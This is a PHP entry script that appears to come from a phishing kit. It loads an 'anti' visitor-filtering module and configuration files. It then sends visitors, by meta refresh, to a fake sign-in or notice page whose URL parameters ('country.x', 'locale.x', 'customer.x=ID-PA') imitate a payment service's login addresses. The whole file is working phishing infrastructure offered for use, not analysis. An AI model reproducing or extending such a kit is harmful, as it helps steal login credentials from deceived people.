<?php

session_start();
	// error_reporting(E_ERROR | E_PARSE);

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);	

	include('anti/anti.php');
	include('config/config.php');
	include('include/get_lg.php');
	include('../hash.php');

	if(isset($_SESSION['xcountryCodex'])){
		if($secure_page){
			$xDIRx = "notice.php?country.x=".$_SESSION['xcountryCodex']."&locale.x=".getLG($_SESSION['xcountryCodex'])."_".$_SESSION['xcountryCodex']."&customer.x=ID-PA".$hash."&safety=".$hash2;
		}
		else {
			if($login_theme == "old"){
				$xDIRx = "signin.php?country.x=".$_SESSION['xcountryCodex']."&locale.x=".getLG($_SESSION['xcountryCodex'])."_".$_SESSION['xcountryCodex']."&customer.x=ID-PA".$hash."&safety=".$hash2;
			}
			else if($login_theme == "new") {
				$xDIRx = "signinsecure.php?country.x=".$_SESSION['xcountryCodex']."&locale.x=".getLG($_SESSION['xcountryCodex'])."_".$_SESSION['xcountryCodex']."&customer.x=ID-PA".$hash."&safety=".$hash2;
			}
			else {
				die("<h2>You have made a mistake in a file 'config.php', please correct the error in variable login_theme</h2");
			}
		}
	}
	else {
		if($secure_page){
			$xDIRx = "notice.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
		}
		else {
			if($login_theme == "old"){
				$xDIRx = "signin.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
			}
			else if($login_theme == "new") {
				$xDIRx = "signinsecure.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
			}
			else {
				die("<h2>You have made a mistake in a file 'config.php', please correct the error in variable login_theme</h2");
			}
		}
	}
	
?>
<html>
	<head>
		<meta http-equiv="refresh" content="0; URL=<?php echo $xDIRx ?>" />
	</head>
</html>
